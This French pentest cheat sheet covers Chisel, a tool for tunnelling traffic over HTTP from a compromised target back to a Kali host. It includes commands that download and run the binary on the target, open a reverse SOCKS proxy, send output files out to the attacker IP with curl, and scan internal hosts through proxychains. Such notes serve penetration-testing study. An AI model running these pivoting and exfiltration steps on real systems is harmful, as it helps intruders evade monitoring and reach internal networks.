# Chisel

Encapsule le trafic dans HTTP (avec chiffrement SSH à l'intérieur). Utile quand un DPI bloque tout sauf HTTP -  les tunnels SSH classiques sont alors inopérants.

Modèle client/serveur : le serveur tourne sur Kali, le client sur la machine compromise. Le trafic sortant de la cible est du HTTP valide.

![](img/Pasted%20image%2020260509213344.png)
# Déployer Chisel sur la cible

```bash
sudo apt install chisel
cp /usr/bin/chisel .
python3 -m http.server
```

> Si la cible a une glibc ancienne (Ubuntu 20.04 et antérieur), le binaire Kali peut échouer avec `GLIBC_2.32 not found`. Télécharger dans ce cas la release officielle compilée avec Go 1.19 :
> ```bash
> wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
> gunzip chisel_1.8.1_linux_amd64.gz
> ```

```bash
# Sur la cible -  télécharger et rendre exécutable
wget <IP_KALI>/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

> Pour récupérer les erreurs depuis un shell aveugle :
> ```bash
> /tmp/chisel client <IP_KALI>:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://<IP_KALI>:8080/
> ```

# Démarrer le serveur Chisel (Kali)

```bash
chisel server --port 8080 --reverse
```

`--reverse` autorise le client à ouvrir un tunnel SOCKS inversé côté serveur.

# Démarrer le client Chisel (cible)

```bash
/tmp/chisel client <IP_KALI>:8080 R:socks
```

Le proxy SOCKS s'ouvre sur `127.0.0.1:1080` côté Kali (port par défaut).

**Vérifier**

```bash
ss -ntplu | grep 1080
```

# Utiliser le tunnel

**Avec Proxychains** -  configurer `/etc/proxychains4.conf` :

```
socks5 127.0.0.1 1080
```

> **`socks5` obligatoire** -  Chisel crée un tunnel SOCKS5, pas SOCKS4. Laisser `socks4` (valeur par défaut de proxychains4) fait silencieusement échouer toutes les connexions.

```bash
proxychains nmap -sT -n -Pn --top-ports=20 <IP_CIBLE>
```

**SSH via ProxyCommand** -  sans passer par Proxychains :

```bash
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' <user>@<IP_CIBLE>
```

> `ncat` (paquet `ncat`) est nécessaire -  le netcat Kali par défaut ne supporte pas le proxying SOCKS.
> ```bash
> sudo apt install ncat
> ```
